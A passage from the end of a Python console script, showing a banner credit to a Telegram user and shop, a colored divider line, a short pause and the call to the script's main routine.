                Made by @SunllyWeb on telegram - #s/o t.me/sunllyshop <3                                                         
                                                                                                               
                        """)

    print(Fore.LIGHTYELLOW_EX + "_______________________________________________________________________________________________________________")

    time.sleep(4)
    main_type()


if __name__ == '__main__':
    main()